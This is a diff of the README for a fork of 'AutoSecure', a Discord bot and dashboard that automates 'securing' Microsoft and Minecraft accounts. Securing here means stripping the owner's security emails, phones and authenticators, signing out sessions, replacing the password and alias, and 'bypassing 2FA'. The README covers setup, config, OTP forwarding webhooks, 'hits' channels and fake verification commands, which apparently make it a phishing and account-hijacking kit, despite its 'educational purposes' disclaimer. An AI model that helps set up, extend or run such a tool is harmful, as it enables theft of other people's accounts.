@@ -1,278 +1,247 @@
-# AutoSecure
+# AutoSecure (fork)
 
-[![Discord](https://img.shields.io/badge/Join%20Our%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/HAtMcWJrBU)
+Fork of [saldevsautosec/autosecure](https://github.com/saldevsautosec/autosecure) — maintained by [waitno01/autosecure](https://github.com/waitno01/autosecure).
 
-**A fully request-based Microsoft account security assessment tool for Discord.** No Selenium. No Playwright. AutoSecure automates the entire process of securing Microsoft accounts, retrieving account details, bypassing 2FA, and verifying Minecraft ownership through a Discord bot with a web dashboard.
+Request-based Microsoft account securing for Discord, with a built-in SMTP server and web dashboard. No Selenium or Playwright.
 
 ---
 
-## Table of Contents
+## Fork changes
 
-- [Features](#features)
-- [Quick Setup](#quick-setup)
+This fork adds fixes and features on top of upstream:
+
+| Area | Change |
+|------|--------|
+| **Mail** | Built-in Discord webhook forwarding + OTP detection (no separate `smtp-discord` needed) |
+| **Mail** | Optional playtime OTP bridge (`mail.otp_bridge_url` in config) |
+| **Securing** | Failure DMs include security email, password, and recovery code when recovery already ran |
+| **Securing** | Lock/suspended/phone-locked detection before and during secure (uses `/check locked` API) |
+| **Securing** | Bedrock / Game Pass accounts without a Java profile handled without crashing |
+| **Securing** | Safer embed building (missing subscription/cape fields, partial success embeds) |
+| **Dashboard** | Delete accounts from list + database |
+| **Ops** | PM2 `ecosystem.config.cjs` for bot, API, and web |
+| **Ops** | `setup.sh` for venv, web build, and PM2 start |
+
+Upstream Discord invite and original docs are not affiliated with this fork.
+
+---
+
+## Table of contents
+
 - [Requirements](#requirements)
-- [Discord Bot Setup](#discord-bot-setup)
-- [API Keys](#api-keys)
+- [Quick setup](#quick-setup)
 - [Configuration](#configuration)
-- [Domain & Tunnel Setup](#domain--tunnel-setup)
-- [Running the Bot](#running-the-bot)
-- [Web Dashboard](#web-dashboard)
-- [Bot Commands](#bot-commands)
+- [Email & DNS](#email--dns)
+- [Running with PM2](#running-with-pm2)
+- [Web dashboard](#web-dashboard)
+- [Bot commands](#bot-commands)
 - [Troubleshooting](#troubleshooting)
 - [Disclaimer](#disclaimer)
-
----
-
-## Features
-
-- Retrieve account owner details (name, country, birth date, language)
-- Remove all security proofs (emails, phone numbers, authenticator apps)
-- Sign out all active devices and sessions
-- Bypass email-based 2FA verification
-- Remove Windows Hello keys (Zyger exploit)
-- Check if an account is locked
-- Disable and re-enable 2FA
-- Add Authenticator with TOTP secret
-- Generate and replace recovery codes
-- Replace primary alias
-- Change security email and password
-- Delete aliases and third-party services
-- Minecraft account checker (ownership, username, name change availability, purchase method, capes, SSID)
-- DonutSMP and Hypixel stats checker
-- Custom domain for security emails with built-in SMTP server
-- Web dashboard (stats, account viewer, manual securing, email inbox, share links)
-- Editable embeds, button customization, command aliases
 
 ---
 
 ## Requirements
 
 | Dependency | Version | Purpose |
-|---|---|---|
-| Python | 3.14 | Bot, API, securing logic |
-| Node.js | LTS | Frontend build (TanStack Start + Vite) |
+|------------|---------|---------|
+| Python | 3.12+ | Bot, API, securing logic, SMTP |
+| Node.js | 20+ (22 recommended for web build) | Dashboard frontend |
+| PM2 | latest | Process manager |
+| Port 25 | open | Inbound SMTP for security emails |
 
 ---
 
-## Quick Setup
-
-> **Important** — This project requires Python 3.14 and Node.js. Port 25 must be open on your server for the SMTP mail server.
+## Quick setup
 
 ```bash
-git clone https://github.com/saldevsautosec/autosecure
+git clone https://github.com/waitno01/autosecure.git
 cd autosecure
 
-pip install -r requirements.txt
-cd web && npm install
-cd ..
+# Create config (never commit this file)
+cp config/config.json.example config/config.json   # if example exists
+# otherwise create config/config.json — see Configuration below
 
-# Linux
-sudo start.sh
-# Windows
-powerhsell
-start.ps1
+# Python deps (3.12+)
+python3.12 -m venv .venv
+.venv/bin/pip install -r requirements.txt
 
+# Web dashboard
+cd web && npm install && npm run build && cd ..
+
+# Start everything
+pm2 start ecosystem.config.cjs
+pm2 save
 ```
 
----
+Or use the helper script (edit Python version in `setup.sh` if your VPS does not have 3.14):
 
-## Discord Bot Setup
-
-1. Go to the [Discord Developer Portal](https://discord.com/developers/applications)
-2. Create a new application → **Bot**
-3. Enable **all Privileged Gateway Intents** (Presence, Server Members, Message Content)
-4. Copy your bot token
-5. Go to **OAuth2 → URL Generator**:
-   - Select scopes: `bot`, `applications.commands`
-   - Select permissions: `Administrator`
-   - Open the generated URL and invite the bot to your server
-
----
-
-## API Keys
-
-*Optional — required only for Minecraft stats features.*
-
-| Service | URL |
-|---|---|
-| Skytools | [developer.skytools.app](https://developer.skytools.app/) |
-| DonutSMP | [api.donutsmp.net](https://api.donutsmp.net/index.html) |
+```bash
+./setup.sh
+```
 
 ---
 
 ## Configuration
 
-Two config files control the entire project. Both are required.
+Two config files control runtime behavior. **`config/config.json` is gitignored** — create it locally and keep secrets out of git.
 
 ### `config/config.json`
 
 ```json
 {
-    "owners": [ YOUR_DISCORD_ID ],
-    "tokens": {
-        "bot_token": "YOUR_BOT_TOKEN",
-        "skytools_key": "YOUR_SKYTOOLS_KEY",
-        "donut_key": "YOUR_DONUT_KEY"
-    },
-    "discord": {
-        "logs_channel": "",
-        "accounts_channel": "",
-        "censored_logs_channel": ""
-    },
-    "autosecure": {
-        "replace_main_alias": true,
-        "enable_2fa": true,
-        "minecon_mode": false
-    },
-    "web": {
-        "credentials": {
-            "username": "<YOUR_USERNAME>",
-            "password": "<YOUR_PASSWORD>",
-            "jwt_secret": "",
-            "totp_secret": ""
-        }
-    },
-    "domain": "yourdomain.com"
+  "owners": [ YOUR_DISCORD_ID ],
+  "tokens": {
+    "bot_token": "YOUR_BOT_TOKEN",
+    "skytools_key": "",
+    "donut_key": ""
+  },
+  "discord": {
+    "logs_channel": "",
+    "accounts_channel": "",
+    "censored_logs_channel": ""
+  },
+  "autosecure": {
+    "replace_main_alias": true,
+    "enable_2fa": true,
+    "minecon_mode": false
+  },
+  "web": {
+    "credentials": {
+      "username": "admin",
+      "password": "CHANGE_ME",
+      "jwt_secret": "GENERATE_A_LONG_RANDOM_STRING"
+    }
+  },
+  "domain": "yourdomain.com",
+  "mail": {
+    "discord_webhook_all": "https://discord.com/api/webhooks/...",
+    "discord_webhook_otp": "https://discord.com/api/webhooks/...",
+    "otp_bridge_url": "http://127.0.0.1:12798/otp",
+    "otp_bridge_token": ""
+  }
 }
 ```
 
 | Key | Description |
-|---|---|
-| `owners` | Discord user IDs with full bot access |
-| `tokens.bot_token` | Discord bot token |
-| `tokens.skytools_key` | Skytools API key (optional) |
-| `tokens.donut_key` | DonutSMP API key (optional) |
-| `discord.logs_channel` | Channel ID where verification logs are sent (use `/set channel`) |
-| `discord.accounts_channel` | Channel ID where secured account details are posted (use `/set channel`) |
-| `discord.censored_logs_channel` | Channel ID for censored logs |
-| `autosecure.replace_main_alias` | Replace the main email alias with a random Outlook one |
-| `autosecure.enable_2fa` | Adds a Authenticator and enables 2FA |
-| `autosecure.minecon_mode` | Disables 2FA and Generates a recovery code only|
-| `web.credentials` | Dashboard login credentials |
-| `domain` | Your custom domain for security emails |
+|-----|-------------|
+| `domain` | Domain for auto-created security emails (`alias@yourdomain.com`) |
+| `mail.discord_webhook_all` | Discord webhook for every incoming email |
+| `mail.discord_webhook_otp` | Discord webhook when an OTP is detected |
+| `mail.otp_bridge_url` | Optional HTTP endpoint (e.g. playtime OTP bridge) |
+| `web.credentials` | Dashboard login + JWT secret |
+| `autosecure.*` | Alias replacement, 2FA, minecon mode |
 
 ### `config/bot.json`
 
-Changes bots behaviour: enabled/disabled commands, slash command aliases, fake commands, embed templates, button text and color, presence, post-verification actions.
+Command toggles, aliases, embed templates, button labels, presence, and post-verification behavior. Tracked in git (no secrets).
+
+### Discord bot setup
+
+1. [Discord Developer Portal](https://discord.com/developers/applications) → create app → **Bot**
+2. Enable all **Privileged Gateway Intents**
+3. OAuth2 URL Generator: scopes `bot` + `applications.commands`, invite to your server
+4. Put the bot token in `config/config.json`
+
+### API keys (optional)
+
+| Service | URL | Used for |
+|---------|-----|----------|
+| Skytools | [developer.skytools.app](https://developer.skytools.app/) | Hypixel / SkyBlock stats |
+| DonutSMP | [api.donutsmp.net](https://api.donutsmp.net/index.html) | Donut stats |
 
 ---
 
-## Domain & Tunnel Setup
+## Email & DNS
 
-The bot runs a built-in SMTP server on port 25 to receive verification emails. You need a domain with port 25 open and a Cloudflare tunnel.
+The bot runs an SMTP server on **port 25** when `autosecure-bot` starts. Mail is stored in SQLite and forwarded to Discord webhooks.
 
-### DNS Records
-
-Add these records in Cloudflare, proxy status to DNS Only:
+### Cloudflare DNS (DNS only / grey cloud)
 
 | Type | Name | Value |
-|---|---|---|
-| A | `mail` | Your server's public IP |
-| MX | `@` | Your domain (e.g. `mail.yourdomain`), priority `10` |
+|------|------|-------|
+| A | `mail` | Your VPS public IP |
+| MX | `@` | `mail.yourdomain.com` (priority 10) |
 
-### Cloudflare Tunnel
-
-1. Install `cloudflared`: [download](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)
-
-2. Create a tunnel:
-
-```bash
-cloudflared tunnel login
-cloudflared tunnel create autosecure
-cloudflared tunnel route dns autosecure yourdomain.com
-```
-
-3. Edit `cloudflared.yml`:
-
-```yaml
-tunnel: autosecure
-credentials-file: /home/user/.cloudflared/<tunnel-id>.json
-ingress:
-  - hostname: yourdomain.com
-    path: /api/*
-    service: http://localhost:8000
-  - hostname: yourdomain.com
-    service: http://localhost:3000
-  - service: http_status:404
-```
+Only one process should bind port 25 on the VPS (this bot — not a separate smtp-discord instance).
 
 ---
 
-## Running the Bot
+## Running with PM2
 
-### Everything (Bot + API + Frontend + Tunnel)
+`ecosystem.config.cjs` starts three processes:
 
-```bash
-sudo start.sh
-```
-
-Or if you're using Windows
-
-```bash
-powerhsell 
-start.ps1
-```
-
-This builds the frontend, starts FastAPI (port 8000), the Nitro frontend server (port 3000), the Cloudflare tunnel, and the Discord bot.
-
-### Bot Only
+| Process | Port | Role |
+|---------|------|------|
+| `autosecure-bot` | 25 (SMTP) | Discord bot + mail server |
+| `autosecure-api` | 8000 | FastAPI backend |
+| `autosecure-web` | 3000 | Dashboard (Nitro build) |
 
 ```bash
-python bot.py
+pm2 start ecosystem.config.cjs
+pm2 logs autosecure-bot
+pm2 restart autosecure-bot autosecure-api autosecure-web
 ```
+
+Update `CORS_ORIGINS` in `ecosystem.config.cjs` if you access the dashboard from a public IP or domain.
+
+### Public access (optional)
+
+Use Cloudflare Tunnel or nginx in front of ports 3000/8000. See upstream `cloudflared.yml` if you use a tunnel.
 
 ---
 
-## Web Dashboard
+## Web dashboard
 
-Access the dashboard at `https://yourdomain.com`. Login with the credentials from `config.json`.
+Default: `http://YOUR_VPS_IP:3000` (or your tunnel/domain).
 
 | Tab | Description |
-|---|---|
-| Overview | Total accounts, Minecraft accounts, daily/montly stats |
-| Accounts | Browse, search, and view secured accounts with full details |
-| Secure | Manually secure accounts (single or bulk) via the dashboard |
-| Bot Config | Servers, command management, embed templates, channels, autosecure toggles |
-| Settings | Change password, configure 2FA for the dashboard |
-| Emails | Manage security email addresses and view inboxes |
+|-----|-------------|
+| Overview | Stats and recent accounts |
+| Accounts | Browse, search, view details, **delete** accounts |
+| Secure | Manual / bulk securing |
+| Emails | Security inboxes |
+| Bot Config | Channels, commands, embeds |
+| Settings | Dashboard password / 2FA |
+
+Login uses `web.credentials` from `config/config.json`.
 
 ---
 
-## Bot Commands
+## Bot commands
 
-> **Tip** — All command names can be changed via web.
+Command names can be renamed in `config/bot.json` or the dashboard.
 
 | Command | Description |
-|---|---|
-| `/secure` | Automatically secure a Microsoft account |
-| `/check locked` | Check if an account is locked |
-| `/auth code` | Generate a TOTP code from a 2FA secret |
-| `/request_otp` | Request a one-time password (2FA bypass) |
-| `/email new` | Register a new security email |
-| `/email inbox` | View the inbox of a security email |
-| `/email list` | List all stored security emails |
-| `/set channel` | Set the logs, censored logs, or hits channel |
-| `/send embed` | Send the verification embed |
-| `/stats donut` | Check DonutSMP stats |
-| `/stats hypixel` | Check Hypixel stats |
+|---------|-------------|
+| `/secure` | Secure via recovery code or auth+password |
+| `/check locked` | Check suspended / phone-locked status (admin) |
+| `/email new` | Create `alias@domain` security email |
+| `/email inbox` | View inbox for a security email |
+| `/email list` | List stored security emails |
+| `/request_otp` | Request OTP / 2FA bypass flow |
+| `/auth code` | TOTP from 2FA secret |
+| `/set channel` | Set logs / hits channels |
+| `/send embed` | Send verification embed |
+| `/stats hypixel` / `/stats donut` | Minecraft stats (needs API keys) |
 
 ---
 
 ## Troubleshooting
 
-| Problem | Solution |
-|---|---|
-| Bot fails to start | Check your bot token in `config.json` and that all Intents are enabled |
-| Emails not being received | Check that port 25 is open and you setup all your domain records |
-| Dashboard login fails | Verify your `web.credentials` in `config.json` |
-| Command names not updating | Bot restart is required after changing aliases in `bot.json` and discord takes time syncing commands |
-| 403 Missing Access errors | The bot doesn't have permission to view/send to the configured channel — check channel IDs |
+| Problem | What to check |
+|---------|----------------|
+| Bot won't start | Python 3.12+, venv deps, valid `bot_token`, intents enabled |
+| Port 25 in use | Stop other SMTP (`pm2 stop mail` / smtp-discord); only one listener |
+| Emails not arriving | DNS A/MX, port 25 open, `domain` in config matches MX domain |
+| Wrong failure message on locked account | Re-pull this fork — lock detection runs before secure |
+| Dashboard login fails | `web.credentials` in `config/config.json` |
+| `git push` goes to wrong host | `git remote set-url origin https://github.com/waitno01/autosecure.git` |
+| Web build fails on Node 20 | Run `node node_modules/vite/bin/vite.js build` inside `web/` |
 
 ---
 
 ## Disclaimer
 
-Use at your own risk.  
-Automation of Microsoft services may violate their Terms of Service and lead to account suspension or bans.  
-This software is provided for educational purposes only.  
-The authors are not responsible for any actions taken by Microsoft.
+Use at your own risk. Automating Microsoft account flows may violate Microsoft's Terms of Service. This software is for educational purposes. The fork maintainers and upstream authors are not responsible for account actions taken by Microsoft or third parties.
+
+**Do not commit** `config/config.json`, `.env`, or `database/database.db` — they contain secrets and secured account data.
